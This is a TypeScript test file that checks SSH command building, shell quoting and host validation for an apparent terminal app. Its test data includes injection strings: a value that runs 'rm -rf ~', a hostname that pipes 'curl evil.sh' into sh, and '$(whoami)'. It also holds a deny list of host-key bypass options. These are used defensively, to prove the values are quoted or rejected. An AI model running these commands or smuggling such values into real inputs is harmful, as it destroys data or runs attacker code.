import { describe, expect, it } from "vitest";
import {
  buildRemoteScript,
  buildSshCommand,
  describeSshTarget,
  isWslIdentityPath,
  quotePath,
  shQuote,
  sshTarget,
  validateSshHost,
} from "../lib/ssh";
import { detectNesting } from "../lib/nesting";
import { sanitizeCommand } from "../lib/ptyExecShell";
import type { SshHostInput } from "../lib/types";

function host(over: Partial<SshHostInput> = {}): SshHostInput {
  return {
    label: "Prod",
    hostname: "prod-01",
    username: null,
    port: null,
    identity_file: null,
    jump_host: null,
    extra_args: null,
    remote_dir: null,
    post_connect: null,
    tag: null,
    color: null,
    ...over,
  };
}

describe("shQuote", () => {
  it("leaves shell-safe words bare", () => {
    for (const s of ["prod-01", "deploy@prod-01", "/srv/app", "a.b_c:d,e=f+g%h"]) {
      expect(shQuote(s)).toBe(s);
    }
  });

  it("quotes whitespace and metacharacters", () => {
    expect(shQuote("my host")).toBe("'my host'");
    expect(shQuote("a;b")).toBe("'a;b'");
    expect(shQuote("$(whoami)")).toBe("'$(whoami)'");
    expect(shQuote("`id`")).toBe("'`id`'");
    expect(shQuote("a&&b")).toBe("'a&&b'");
    expect(shQuote("a|b")).toBe("'a|b'");
  });

  it("escapes embedded single quotes", () => {
    expect(shQuote("it's")).toBe(`'it'\\''s'`);
  });

  it("renders the empty string as an explicit empty word", () => {
    expect(shQuote("")).toBe("''");
  });
});

describe("quotePath", () => {
  it("keeps a leading ~/ outside the quotes so it still expands", () => {
    expect(quotePath("~/My Keys/id_ed25519")).toBe("~/'My Keys/id_ed25519'");
    expect(quotePath("~/.ssh/id_ed25519")).toBe("~/.ssh/id_ed25519");
    expect(quotePath("~")).toBe("~");
  });

  it("quotes absolute paths whole", () => {
    expect(quotePath("/Users/me/My Keys/id")).toBe("'/Users/me/My Keys/id'");
  });
});

describe("buildSshCommand", () => {
  it("builds a bare connect", () => {
    expect(buildSshCommand(host())).toBe("ssh prod-01");
  });

  it("adds user and port", () => {
    expect(buildSshCommand(host({ username: "deploy", port: 2222 }))).toBe(
      "ssh -p 2222 deploy@prod-01",
    );
  });

  it("quotes an identity path containing a space", () => {
    expect(buildSshCommand(host({ identity_file: "/Users/me/My Keys/id_ed25519" }))).toBe(
      "ssh -i '/Users/me/My Keys/id_ed25519' prod-01",
    );
    expect(buildSshCommand(host({ identity_file: "~/My Keys/id_ed25519" }))).toBe(
      "ssh -i ~/'My Keys/id_ed25519' prod-01",
    );
  });

  it("adds a jump host", () => {
    expect(
      buildSshCommand(host({ hostname: "10.0.0.5", username: "root", jump_host: "jump@bastion:2222" })),
    ).toBe("ssh -J jump@bastion:2222 root@10.0.0.5");
  });

  it("wraps a remote directory in a -t script", () => {
    expect(buildSshCommand(host({ username: "deploy", remote_dir: "/srv/app releases" }))).toBe(
      `ssh -t deploy@prod-01 'cd -- '\\''/srv/app releases'\\''; exec "\${SHELL:-/bin/sh}" -l'`,
    );
  });

  it("keeps post-connect operators intact on the remote side", () => {
    expect(
      buildSshCommand(host({ remote_dir: "/srv/app", post_connect: "tmux attach || tmux new -s main" })),
    ).toBe(`ssh -t prod-01 'cd -- /srv/app; tmux attach || tmux new -s main; exec "\${SHELL:-/bin/sh}" -l'`);
  });

  it("passes extra flags through, re-quoting each token", () => {
    expect(buildSshCommand(host({ extra_args: "-o ConnectTimeout=5 -vv" }))).toBe(
      "ssh -o ConnectTimeout=5 -vv prod-01",
    );
    // A quoted option value stays a single argument.
    expect(buildSshCommand(host({ extra_args: '-o "ProxyCommand=nc -X 5 %h %p"' }))).toBe(
      "ssh -o 'ProxyCommand=nc -X 5 %h %p' prod-01",
    );
  });

  it("contains a shell-injection attempt inside one local argument", () => {
    // The archetypal attack: close the quote, run something, reopen. Quoting the
    // whole remote script means the `;` is data to the local shell, never syntax.
    const cmd = buildSshCommand(
      host({ remote_dir: "/srv", post_connect: "x'; rm -rf ~; echo '" }),
    );
    expect(cmd).toBe(
      `ssh -t prod-01 'cd -- /srv; x'\\''; rm -rf ~; echo '\\''; exec "\${SHELL:-/bin/sh}" -l'`,
    );
    // Everything after `ssh -t prod-01 ` is a single quoted word.
    const tail = cmd.slice("ssh -t prod-01 ".length);
    expect(tail.startsWith("'")).toBe(true);
    expect(tail.endsWith("'")).toBe(true);
  });

  it("quotes a hostname that somehow slipped past validation", () => {
    // Defence in depth: validate() rejects this shape, but if a row is edited
    // straight in the DB the quoting must still contain it.
    expect(buildSshCommand(host({ hostname: "h; curl evil.sh | sh" }))).toBe(
      "ssh 'h; curl evil.sh | sh'",
    );
  });
});

describe("buildRemoteScript", () => {
  it("is null when there is nothing to run remotely", () => {
    expect(buildRemoteScript(host())).toBeNull();
  });

  it("always ends by exec'ing an interactive login shell", () => {
    expect(buildRemoteScript(host({ remote_dir: "/srv" }))).toMatch(/; exec "\$\{SHELL:-\/bin\/sh\}" -l$/);
  });

  it("adds -t only when a script is present", () => {
    expect(buildSshCommand(host())).not.toContain("-t");
    expect(buildSshCommand(host({ post_connect: "htop" }))).toContain("ssh -t ");
  });
});

describe("describeSshTarget", () => {
  it("shows a non-default port only", () => {
    expect(describeSshTarget(host({ username: "deploy", port: 2222 }))).toBe("deploy@prod-01:2222");
    expect(describeSshTarget(host({ port: 22 }))).toBe("prod-01");
    expect(describeSshTarget(host())).toBe("prod-01");
  });
});

// Every command this module can emit must be typeable AND must still be
// understood by the nesting detector. Both are cross-module invariants that
// break silently, so they are asserted over one shared fixture list.
const FIXTURES: SshHostInput[] = [
  host(),
  host({ username: "deploy", port: 2222 }),
  host({ identity_file: "~/My Keys/id_ed25519" }),
  host({ identity_file: "/Users/me/My Keys/id_ed25519" }),
  host({ hostname: "10.0.0.5", username: "root", jump_host: "jump@bastion:2222" }),
  host({ username: "deploy", remote_dir: "/srv/app releases" }),
  host({ remote_dir: "/srv/app", post_connect: "tmux attach || tmux new -s main" }),
  host({ extra_args: "-o ConnectTimeout=5 -vv" }),
  host({ extra_args: '-o "ProxyCommand=nc -X 5 %h %p"' }),
  host({ username: "deploy", port: 2222, identity_file: "~/.ssh/id", remote_dir: "/srv" }),
];

describe("cross-module invariants", () => {
  it.each(FIXTURES)("passes sanitizeCommand: %o", (h) => {
    const result = sanitizeCommand(buildSshCommand(h));
    expect(result.ok).toBe(true);
  });

  // THE load-bearing test. If someone adds an ssh flag that VALUE_FLAGS in
  // nesting.ts does not know consumes a value, target detection breaks
  // silently: every ssh tab then loses its remote context, its title, and the
  // cwd suppression that keeps a remote path out of the model's context.
  it.each(FIXTURES)("round-trips through detectNesting: %o", (h) => {
    const nested = detectNesting(buildSshCommand(h));
    expect(nested).not.toBeNull();
    expect(nested?.kind).toBe("ssh");
    expect(nested?.target).toBe(sshTarget(h));
  });
});

describe("validateSshHost", () => {
  const errorsFor = (over: Partial<SshHostInput>) => validateSshHost(host(over)).map((e) => e.field);

  it("accepts a well-formed host", () => {
    expect(validateSshHost(host({ username: "deploy", port: 2222 }))).toEqual([]);
  });

  it("requires a label and a hostname", () => {
    expect(errorsFor({ label: "  " })).toContain("label");
    expect(errorsFor({ hostname: "" })).toContain("hostname");
  });

  it("rejects malformed hostnames", () => {
    for (const bad of ["prod 01", "prod;01", "-prod", "prod-", "$(whoami)"]) {
      expect(errorsFor({ hostname: bad })).toContain("hostname");
    }
  });

  it("accepts IPv4 and bracketed IPv6", () => {
    expect(errorsFor({ hostname: "10.0.0.5" })).toEqual([]);
    expect(errorsFor({ hostname: "[2001:db8::1]" })).toEqual([]);
  });

  it("rejects out-of-range ports", () => {
    expect(errorsFor({ port: 0 })).toContain("port");
    expect(errorsFor({ port: 70000 })).toContain("port");
    expect(errorsFor({ port: 22 })).toEqual([]);
  });

  it("rejects control characters", () => {
    expect(errorsFor({ post_connect: "tmux attach\rrm -rf /" })).toContain("post_connect");
  });

  it("rejects host-key bypass options", () => {
    for (const bad of [
      "-o StrictHostKeyChecking=no",
      "-o stricthostkeychecking=accept-new",
      "-o UserKnownHostsFile=/dev/null",
    ]) {
      expect(errorsFor({ extra_args: bad })).toContain("extra_args");
    }
  });

  it("rejects a bare word in extra args but allows flags", () => {
    expect(errorsFor({ extra_args: "-v somehost" })).toContain("extra_args");
    expect(errorsFor({ extra_args: "-o ConnectTimeout=5 -vv" })).toEqual([]);
  });

  it("catches an over-long command in the form", () => {
    expect(errorsFor({ post_connect: "x".repeat(5000) })).toContain("command");
  });
});

describe("Windows WSL identity paths", () => {
  it("accepts Linux paths and rejects host paths or traversal", () => {
    expect(isWslIdentityPath("~/.ssh/id_ed25519")).toBe(true);
    expect(isWslIdentityPath("/home/casey/.ssh/work key")).toBe(true);
    expect(isWslIdentityPath("C:\\Users\\casey\\.ssh\\id_ed25519")).toBe(false);
    expect(isWslIdentityPath("/home/casey/../root/key")).toBe(false);
  });
});
